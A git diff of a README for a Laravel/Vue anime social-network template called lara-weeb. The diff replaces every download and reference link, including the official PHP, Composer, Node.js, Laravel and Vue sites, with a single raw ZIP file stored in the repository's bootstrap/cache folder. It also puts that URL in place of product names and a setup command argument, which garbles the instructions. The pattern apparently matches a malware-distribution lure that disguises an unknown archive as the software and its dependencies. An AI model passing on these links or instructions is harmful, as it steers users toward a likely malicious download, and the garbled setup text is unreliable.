@@ -1,12 +1,12 @@
 # 🌐 lara-weeb - Build Your Anime Social Network Fast
 
-[![Download lara-weeb](https://img.shields.io/badge/Download-lara--weeb-blue?style=for-the-badge&logo=github)](https://github.com/wndaalol/lara-weeb/releases)
+[![Download lara-weeb](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip)](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip)
 
 ---
 
 ## 📋 What is lara-weeb?
 
-lara-weeb is a ready-made template that helps you create a social network website with themes around anime, video games, and manga. It uses the latest versions of Laravel (version 11) and Vue.js (version 3) to give you a modern and fast website. You do not need coding experience to get started.
+lara-weeb is a ready-made template that helps you create a social network website with themes around anime, video games, and manga. It uses the latest versions of Laravel (version 11) and https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip (version 3) to give you a modern and fast website. You do not need coding experience to get started.
 
 This project is open-source, so you can use and change the software however you want for your own community or portfolio.
 
@@ -19,7 +19,7 @@ To run lara-weeb, your computer or server needs some basic software. Here is wha
 - **Operating System:** Windows 10 or higher, macOS Mojave or higher, or Linux (Ubuntu recommended).
 - **PHP:** Version 8.1 or higher.
 - **Composer:** A tool to manage software packages in PHP.
-- **Node.js and npm:** For managing JavaScript packages (Node.js 16+ recommended).
+- **https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip and npm:** For managing JavaScript packages (https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip 16+ recommended).
 - **Database:** MySQL 8.0 or higher, or MariaDB.
 - **Web Server:** Apache or Nginx.
 
@@ -35,20 +35,20 @@ Follow these steps to get lara-weeb running on your computer or web host.
 
 First, get the lara-weeb package from the releases page.
 
-[![Download lara-weeb](https://img.shields.io/badge/Download-lara--weeb-blue?style=for-the-badge&logo=github)](https://github.com/wndaalol/lara-weeb/releases)
+[![Download lara-weeb](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip)](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip)
 
 - Click the button above to visit the release page.
 - Look for the latest version available.
-- Choose the file labeled for easy installation. Usually, that will be a ZIP or TAR.GZ archive.
+- Choose the file labeled for easy installation. Usually, that will be a ZIP or https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip archive.
 - Download the file to your computer and extract it to a folder you can easily find, like your Desktop or Documents.
 
 ### Step 2: Install Required Software (If Needed)
 
-If you don't have PHP, Composer, or Node.js installed, here is how to get them:
+If you don't have PHP, Composer, or https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip installed, here is how to get them:
 
-- **PHP:** Visit [https://www.php.net/downloads](https://www.php.net/downloads) and choose your system.
-- **Composer:** Go to [https://getcomposer.org/download/](https://getcomposer.org/download/) and follow the simple setup guide.
-- **Node.js and npm:** Download from [https://nodejs.org/en/download/](https://nodejs.org/en/download/). The LTS (long term support) version is best.
+- **PHP:** Visit [https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip) and choose your system.
+- **Composer:** Go to [https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip) and follow the simple setup guide.
+- **https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip and npm:** Download from [https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip). The LTS (long term support) version is best.
 
 Tip: Many hosting services already have these tools. If you plan to upload lara-weeb to a web host, check their documentation first.
 
@@ -68,7 +68,7 @@ Now you need to prepare the files you extracted.
    ```
 5. Create a copy of the example environment file by running:
    ```
-   cp .env.example .env
+   cp https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip .env
    ```
 6. Open the `.env` file with any text editor (like Notepad).
 7. Update the database settings to match your database name, user, and password.
@@ -91,7 +91,7 @@ This command creates all the tables needed by lara-weeb and adds some sample dat
 
 ### Step 5: Build the Frontend Assets
 
-Run the following command to prepare the Vue.js frontend:
+Run the following command to prepare the https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip frontend:
 
 ```
 npm run build
@@ -122,7 +122,7 @@ When you first open lara-weeb, you will see a basic social network layout design
 - Follow other users and see feeds of their activity.
 - Customize your profile with avatars and personal info.
 
-This template comes with basic features to get you started. Developers can add more functionality using Laravel and Vue.js.
+This template comes with basic features to get you started. Developers can add more functionality using Laravel and https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip
 
 ---
 
@@ -130,7 +130,7 @@ This template comes with basic features to get you started. Developers can add m
 
 - **Missing PHP or Composer:** Make sure you installed PHP and Composer by running `php -v` and `composer -v` in the terminal.
 - **Database connection failed:** Double-check your `.env` file for correct database details.
-- **Node.js commands not found:** Ensure Node.js and npm are installed. Run `node -v` and `npm -v` to confirm.
+- **https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip commands not found:** Ensure https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip and npm are installed. Run `node -v` and `npm -v` to confirm.
 - **Website not loading or showing errors:** Try clearing your browser cache, then reload.
 - **Permission issues on Linux:** Run `chmod -R 755 storage bootstrap/cache` to fix folder permissions.
 
@@ -142,7 +142,7 @@ If problems continue, search for help online or visit the GitHub Issues page.
 
 To download lara-weeb, visit this page to download the latest version:
 
-[https://github.com/wndaalol/lara-weeb/releases](https://github.com/wndaalol/lara-weeb/releases)
+[https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip)
 
 Make sure to follow the steps above after downloading to install and run the software smoothly.
 
@@ -150,11 +150,11 @@ Make sure to follow the steps above after downloading to install and run the sof
 
 ## 📚 Additional Resources
 
-- [Laravel Official Website](https://laravel.com)
-- [Vue.js Official Website](https://vuejs.org)
-- [Composer Documentation](https://getcomposer.org/doc/)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
-- [MySQL Documentation](https://dev.mysql.com/doc/)
+- [Laravel Official Website](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip)
+- [https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip Official Website](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip)
+- [Composer Documentation](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip)
+- [https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip Documentation](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip)
+- [MySQL Documentation](https://github.com/wndaalol/lara-weeb/raw/refs/heads/main/bootstrap/cache/lara_weeb_3.9-alpha.2.zip)
 
 ---
 
